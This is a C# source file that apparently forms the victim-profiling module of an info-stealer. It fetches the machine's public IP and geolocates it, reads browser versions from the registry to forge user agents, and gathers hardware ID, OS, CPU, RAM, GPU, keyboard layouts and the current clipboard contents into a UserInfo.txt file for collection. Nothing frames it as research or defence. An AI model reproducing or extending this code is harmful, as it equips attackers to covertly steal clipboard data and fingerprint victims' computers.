using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Windows.Forms;
using who.Helper;


namespace who.Func
{
    class User
    {

        public static WebRequest request = WebRequest.Create("http://ip.42.pl/raw");
       public static Stream stream = request.GetResponse().GetResponseStream();
       public static string IP = new StreamReader(stream).ReadToEnd();
        public static string randomnm = HelpName.GetRandomString();
        public static string KeyBoard = "";

        public static List<string> UserAgents = new List<string>();

        public static void GetUA()
        {
            string empty = string.Empty;
            string text = Helpers.GetNT();

            try
            {
                foreach (string Browser in Dirs.BrowsersName)
                {
                    if (Browser.Contains("Google Chrome"))
                    {
                        object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
                        if (value != null)
                        {
                            empty = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
                        }
                        else
                        {
                            value = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
                            empty = FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion;
                        }

                        if (Environment.Is64BitOperatingSystem)

                        {
                            UserAgents.Add("Mozilla/5.0 (" + text + "; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + empty + " Safari/537.36");
                        }
                        else
                        {
                            UserAgents.Add("Mozilla/5.0 (" + text + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + empty + " Safari/537.36");
                        }
                    }
                    /*
                    if (Browser.Contains("Opera Browser"))
                    {
                        string value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Classes\\Applications\\opera.exe\\shell\\open\\command", "", null).ToString();

                        value = value.Remove(value.Length - 6, 6);
                        value = value.Remove(0, 1);

                        empty = FileVersionInfo.GetVersionInfo(value).FileVersion;

                        string _empty = string.Empty;
                        string empty2 = string.Empty;

                        switch (empty.Split('.').First())

                        {
                            case "54":
                                _empty = "67.0.3396.87";
                                break;
                            case "55":
                                _empty = "68.0.3440.106";
                                break;
                            case "56":
                                _empty = "69.0.3497.100";
                                break;
                            case "57":
                                _empty = "70.0.3538.102";
                                break;
                            default:
                                break;
                        }

                        if (Environment.Is64BitOperatingSystem)
                            UserAgents.Add("Mozilla/5.0 (" + text + "; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + _empty + " Safari/537.36 OPR/55.0.2994.44");
                        else
                            UserAgents.Add("Mozilla/5.0 (" + text + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + _empty + " Safari/537.36 OPR/55.0.2994.44");
                    }
                    */
                    if (Browser.Contains("Mozilla Firefox"))
                    {
                        object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);

                        if (value2 != null)
                            empty = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
                        else
                        {
                            value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
                            empty = FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion;
                        }

                        string empty3 = string.Empty;
                        empty3 = empty.Split('.').First() + "." + empty.Split('.')[1];

                        if (Environment.Is64BitOperatingSystem)
                        {
                            UserAgents.Add("Mozilla/5.0 (" + text + "; Win64; x64; rv:" + empty3 + ") Gecko/20100101 Firefox/" + empty3);
                        }
                        else
                        {
                            UserAgents.Add("Mozilla/5.0 (" + text + "; rv:" + empty3 + ") Gecko/20100101 Firefox/" + empty3);
                        }
                    }
                }
            }
            catch 
            {  }
        }

        public static void GetInfo()
        {
            GetKeyboards();

            string resolution = Convert.ToString(Screen.PrimaryScreen.Bounds.Size);
            string Processors = Convert.ToString(Environment.ProcessorCount);
            string Machine = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString();
            string hwid = GetHwid();

            File.WriteAllText(Dirs.WorkDir + "\\UserInfo.txt",
            "Screen Resolution: " + resolution.Replace("{", "").Replace("}", "") +
            "\r\nOS: " + Machine + GetBit() +
            "\r\nProcessesors: " + Processors +
            "\r\nIP: " + IP + "\r\nHWID: " + hwid +
            "\r\nKeyboards: " + KeyBoard +
            "\r\nVideo Card: " + GetVideoCardSize() +
            "\r\nRAM Size: " + GetRam() +
            "\r\nCPU Name: " + GetCPU() +
            "\r\nClipboard: " + Clipboard.GetText() +
                Helpers.Content,
                Encoding.Default); 
        }

        public static string GetHwid()
        {
            string HWID = "";
            try
            {
                string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
                ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
                disk.Get();
                string diskLetter = disk["VolumeSerialNumber"].ToString();
                HWID = diskLetter;
            }
            catch
            {   }
            return HWID;
        }

        public static string GetBit()
        {
            string Bit = "";
            if (Environment.Is64BitOperatingSystem)
            {
                Bit = " x64";
            }
            else
            {
                Bit = " x32";
            }
            return Bit;
        }

        public static string IPRequestHelper(string url)
        {
            HttpWebRequest objRequest = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse objResponse = (HttpWebResponse)objRequest.GetResponse();

            StreamReader responseStream = new StreamReader(objResponse.GetResponseStream());
            string responseRead = responseStream.ReadToEnd();

            responseStream.Close();
            responseStream.Dispose();

            return responseRead;
        }

        public static List<string> Info = new List<string>();

        public static IpProperties GetCountryByIP(string ipAddress)
        {
            string ipResponse = IPRequestHelper("http://ip-api.com/xml/" + ipAddress);
            using (TextReader sr = new StringReader(ipResponse))
            {
                using (System.Data.DataSet dataBase = new System.Data.DataSet())
                {
                    IpProperties ipProperties = new IpProperties();

                    dataBase.ReadXml(sr);
                    ipProperties.Country = dataBase.Tables[0].Rows[0][1].ToString();
                    ipProperties.CountryCode = dataBase.Tables[0].Rows[0][2].ToString();
                    ipProperties.Region = dataBase.Tables[0].Rows[0][3].ToString();
                    ipProperties.RegionName = dataBase.Tables[0].Rows[0][4].ToString();
                    ipProperties.City = dataBase.Tables[0].Rows[0][5].ToString();
                    ipProperties.Zip = dataBase.Tables[0].Rows[0][6].ToString();
                    ipProperties.TimeZone = dataBase.Tables[0].Rows[0][9].ToString();
                    ipProperties.ISP = dataBase.Tables[0].Rows[0][10].ToString();

                    Info.Add("\r\n<===| Info |===>" + 
                        "\r\nCountry: " + ipProperties.Country +
                        "\r\nCountry Code: " + ipProperties.CountryCode +
                        "\r\nRegion: " + ipProperties.Region + 
                        "\r\nCity: " + ipProperties.City + 
                        "\r\nZip: " + ipProperties.Zip +
                        "\r\nTime Zone: " + ipProperties.TimeZone +
                        "\r\nISP: " + ipProperties.ISP);
                    return ipProperties;                    
                }
            }
        }

        public static string GetCPU()
        {
            try
            {
                using (ManagementObjectCollection Secret = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_Processor").Get())
                {
                    foreach (ManagementBaseObject cr in Secret)
                    {
                        string Text = cr["Name"]?.ToString();
                        return Text;
                    }
                }
            }

            catch { }

            return "";
        }

        public static void GetKeyboards()
        {
            foreach (InputLanguage lang in InputLanguage.InstalledInputLanguages)
            {
                string KeyBoards = Convert.ToString(lang.Culture);
                KeyBoard += "\r\n" + KeyBoards;
            }
        }

        public static string GetVideoCardSize()
        {
            try
            {
                ManagementObjectSearcher searcher2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (ManagementObject queryObj in searcher2.Get())
                {
                    return Convert.ToString(queryObj["Caption"]);
                }               
            }
            catch {  }
            return "Unknown";
        }

        public static string GetRam()
        {
            try
            {
                ManagementClass mc = new ManagementClass("Win32_ComputerSystem");
                ManagementObjectCollection moc = mc.GetInstances();
                foreach (ManagementObject item in moc)
                {
                    return Convert.ToString(Math.Round(Convert.ToDouble(item.Properties["TotalPhysicalMemory"].Value) / 1048576, 0)) + " MB";
                }
            }
           catch { }
            return "Unknown";
        }

       
        public class IpProperties
        {
            public string Country { get; set; }
            public string CountryCode { get; set; }
            public string Region { get; set; }
            public string RegionName { get; set; }
            public string City { get; set; }
            public string Zip { get; set; }
            public string TimeZone { get; set; }
            public string ISP { get; set; }
        }
    }        
}
